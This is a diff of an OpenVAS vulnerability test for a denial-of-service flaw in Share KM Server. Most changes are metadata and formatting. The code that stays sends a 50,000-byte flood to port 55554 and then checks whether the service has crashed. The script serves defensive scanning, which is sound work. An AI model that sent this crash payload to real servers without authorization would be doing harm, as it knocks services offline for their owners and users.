@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sharekm_server_dos_vuln.nasl 4689 2016-12-06 13:13:22Z cfi $
+# $Id: gb_sharekm_server_dos_vuln.nasl 11103 2018-08-24 10:37:26Z mmartin $
 #
 # Share KM Server Remote Denial Of Service Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803762");
-  script_version("$Revision: 4689 $");
+  script_version("$Revision: 11103 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-06 14:13:22 +0100 (Tue, 06 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-09-23 15:05:45 +0530 (Mon, 23 Sep 2013)");
   script_name("Share KM Server Remote Denial Of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -41,32 +41,17 @@ if(description)
 
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28451");
 
-  tag_summary = "This host is running Share KM Server and is prone to denial of service
-  vulnerability.";
 
-  tag_vuldetect = "Send crafted request and check is it vulnerable to DoS or not.";
+  script_tag(name:"summary", value:"This host is running Share KM Server and is prone to denial of service
+  vulnerability.");
+  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"insight", value:"The flaw is due to an error when handling specially crafted requests which can
+  be exploited to crash the server.");
+  script_tag(name:"affected", value:"Share KM versions 1.0.19 and prior.");
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to cause a denial of service.
 
-  tag_insight = "The flaw is due to an error when handling specially crafted requests which can
-  be exploited to crash the server.";
-
-  tag_impact = "Successful exploitation will allow remote attacker to cause a denial of service.
-
-  Impact Level: Application";
-
-  tag_affected = "Share KM versions 1.0.19 and prior.";
-
-  tag_solution = "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.";
-
-
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"vuldetect", value:tag_vuldetect);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"impact", value:tag_impact);
+  Impact Level: Application");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -82,7 +67,6 @@ recv = "";
 ## Sharekm Server default port
 frcviPort = 55554;
 
-## Check the port status
 if(!get_port_state(frcviPort)){
   exit(0);
 }
@@ -102,7 +86,6 @@ if(!recv)
   exit(0);
 }
 
-## Construct an attack request
 req = crap(data: "A", length:50000);
 
 ## Sending Request
@@ -111,7 +94,6 @@ close(soc);
 
 sleep(2);
 
-## check the port and confirmed the crash or not
 soc = open_sock_tcp(frcviPort);
 if(!soc)
 {
@@ -120,7 +102,6 @@ if(!soc)
 }
 else
 {
-  ## check the response and confirme the crash or not
   send(socket:soc, data:"GET / HTTP1.1\r\n");
   recv = recv(socket:soc, length:1024);
   if(!recv)
